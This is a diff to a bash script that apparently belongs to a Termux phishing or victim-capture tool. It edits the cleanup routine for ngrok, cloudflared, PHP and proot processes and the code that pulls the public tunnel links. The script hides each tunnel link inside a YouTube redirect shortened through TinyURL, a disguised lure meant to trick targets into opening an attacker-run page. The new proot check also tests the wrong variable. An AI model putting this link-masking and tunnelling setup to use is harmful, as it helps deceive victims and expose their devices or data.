@@ -116,6 +116,7 @@ stop() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkcloud=$(ps aux | grep -o "cloudflared" | head -n1)
+checkproot=$(ps aux | grep -o "proot" | head -n1)
 
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
@@ -127,9 +128,14 @@ pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
 fi
 
+if [[ $checkngrok == *'proot'* ]]; then
+pkill -f -2 proot > /dev/null 2>&1
+killall -2 proot > /dev/null 2>&1
+fi
+
 if [[ $checkcloud == *'cloudflared'* ]]; then
 pkill -f -2 cloudflared > /dev/null 2>&1
-killall ssh > /dev/null 2>&1
+killall cloudflared > /dev/null 2>&1
 fi
 
 if [[ -e sendlink ]]; then
@@ -219,7 +225,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting forward servers...\n"
 termux-chroot ./cloudflared -url 127.0.0.1:5678 --logfile ${PWD}/cloudflare-log > /dev/null 2>&1 &
 sleep 20
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
-clflare=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${PWD}/cloudflare-log")
+clflare=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' "${PWD}/cloudflare-log")
 printf "\e[1;92m[\e[0m*\e[1;92m] (NGROK) link:\e[0m\e[1;77m %s\e[0m\n" $link
 printf "\e[1;92m[\e[0m*\e[1;92m] (CooudFlare) link:\e[0m\e[1;77m %s\e[0m\n" $clflare
 send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
